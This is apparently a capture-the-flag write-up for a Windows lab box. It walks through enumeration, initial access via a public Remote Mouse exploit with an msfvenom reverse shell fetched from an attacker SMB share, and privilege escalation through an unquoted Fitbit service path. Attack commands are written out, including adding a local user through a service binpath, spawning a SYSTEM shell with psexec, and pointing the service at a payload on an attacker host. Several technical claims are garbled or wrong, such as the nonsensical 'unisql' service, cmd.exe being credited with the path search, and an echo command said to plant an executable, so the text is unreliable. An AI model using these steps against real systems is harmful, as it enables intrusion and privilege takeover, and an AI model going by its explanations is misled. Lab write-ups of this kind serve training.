# CTF 7.unquotable

### 2.0 Introduction

* This involves the CTF Machine name ‘unquotable’.

### 3.0 Independent Challenges

#### 3.1 Target 1 (192.168.100.139/192.168.50.90)

#### 3.2 Network Service Enumeration

* Server IP Address
* Open PORTs
* IP Address (192.168.100.139/192.168.50.90)
* Port number (21,80,135,139,445,1978,1979,1980,49668)

**Nmap Scan Result**

* Found these open ports in Nmap Scan.<br>
* There are multiple ports open, so decide with the `-A` aggressive scan.<br>

#### 3 Network Service Enumeration

* Fuzz the application.
* FTP anonymous login<br>
* Http service<br>
* Got Nothing<br>
* SMB Enumeration<br>
* User2 has something in folder rob<br>

#### 3.4 Initials Access - (Remote Mouse Execute)

* Vulnerability Explanation: The vulnerability lies in the Remote Mouse execution payload, which can be exploited in a unisql environment. This payload designed to mimic human interactions from the computer's perspective. Utilizing this payload, an attacker can gain access to the SMB share hosted on the attacker's system. Within the attacker's host, there is an msfvenom payload that facilitates the creation of a reverse shell.
* Vulnerability Fix: Stop unwanted ports and services.
* Severity: critical.

**Steps to Reproduce**

{% stepper %}
{% step %}
### Analysed the issue

* Service uniql only one port is responseding.<br>
{% endstep %}

{% step %}
### Found an exploit on the internet

* On the internet found the Code which can give initial access.<br>

Link :- https://www.exploit-db.com/exploits/46697

* Changes the listing IP address of attacker and Port as per enviroment.<br>
{% endstep %}

{% step %}
### Create the payload

Msfvenom
{% endstep %}

{% step %}
### Host SMB on the attacker machine

SMB Hosted on Attacker Machine
{% endstep %}

{% step %}
### Listen for the reverse shell

Listing for Reverse shell
{% endstep %}
{% endstepper %}

#### 3.5 Privileged Escalation - (Service Path is unquotable)

* Vulnerability Explanation:
  * Cmd.exe checks for .exe files after every directory change.
  * If the Fitbit binary path is not quoted, the attacker can create .exe files in the Fitbit folder.
  * Cmd.exe searches for .exe files in every directory jump. Fitbit uses NT authorized privileges. After finding the attacker.exe, cmd.exe will execute it using NT privileges during the process of starting the genuine Fitbit Connect service.exe, which is located in the Fitbit folder and has another folder in it called Fitbit Connect Service.
* Vulnerability Fix: The service path can be fixed by using double quotes as follows:
  * `sc.exe config "Fitbit Connect" binpath="C:\Program Files (x86)\fit bit\Fitbit Connect\FitbitConnectService.exe"`
  * Additionally, the vulnerability can be further mitigated by adjusting permissions to restrict access only to administrators on the "Program Files" directory.
* Severity: Critical.

**Steps to Reproduce**

{% stepper %}
{% step %}
### Understand Windows services

* To understand this, the first step is Windows Service.
* When typical services are considered, most are part of the operating system, such as Windows Update, Windows Backup, Wired AutoConfig for 802.1x packet authentication, and machine authentication.
* The key concepts include the service name and the startup type, which can be manual or automatic. Manual services are started by the user, while automatic services start automatically. There is also a delayed automatic startup type, which means it starts after every other automatic service is initiated.
* The "Log On As" option has two choices: Local System and Network Service. Local System has the highest NT authority, while Network Service is intended for networking.
* The same information is available in the Command Line Interface (CLI) using the `sc` command.
* `sc` is a command-line program used to interact with services but only in the case of high privileges. The name displayed in the graphical user interface (GUI) is the display name, and in the CLI, it's different.

```bash
sc.exe qc <servicename>
```

* `qc` is for single queries.
* The start type "DEMAND START" in the CLI corresponds to "Manual" in the GUI.
* The binary path reveals the location where the service is executed. You can create a custom service using `sc.exe`:

```bash
sc.exe create shadow binpath="whoami" >> C:\Test.txt
```

* After this, modify the DEMAND TYPE to "Manual" with:

```bash
sc.exe config shadow start=auto
```

* View the service information:

```bash
sc.exe qc shadow
```

* When set to auto-start, it will execute after bootup.
* Query for overall information:

```bash
sc.exe query shadow
```

* Gives information about when and if it is executed.

```bash
sc.exe qc
```

* Shows details about the services, including when and how they will execute.
* Change user using `sc`:

```bash
sc.exe config shadow binpath="net user shadow Password@123 /add"
```

* What is PsExec?
* PsExec is software that can help gain maximum privileged accounts for a particular operating system.
* Example command for interactive system privilege, the highest privilege:

```bash
psexec -i -s cmd.exe
```
{% endstep %}

{% step %}
### Find the vulnerable service path

* Os Enumeration using winPEAS\
  WinPEAS
* Found the Directory where FitBit Service is binpath is unquoted.<br>
* Checking user Privilege that can execute revsershell in Fitbit Service directory.<br>
{% endstep %}

{% step %}
### Execute the reverse shell

* Exeuting revershell using SMB.

```bash
Echo \\<attackerip>\share\rev.exe > Fitbit.exe
```

* Got the reverse shell.<br>
{% endstep %}

{% step %}
### Restart the service

* To obtain privileged access to the Fitbit service, it is necessary to restart the Windows service. This ensures that when the Fitbit service runs, it navigates to its designated directory. Before this, cmd.exe will search for attacker.exe, and the executable will be executed each time cmd.exe traverses to a new directory.
* To restart the service, the command is `shutdown /r /t 0`, where `/r` indicates a reboot, and `/t 0` means the restart should occur immediately.

```bash
shutdown /r /t 0
```

* Listing for the privilege.exe to get execute.<br>
{% endstep %}
{% endstepper %}

#### 3.6 Post Exploitation (Local or Proof Flags)

* System proof Screenshot.
* Final Proof Flags.
* Goodies.

#### 3.7 Failed Attempted

Mimikatz.exe
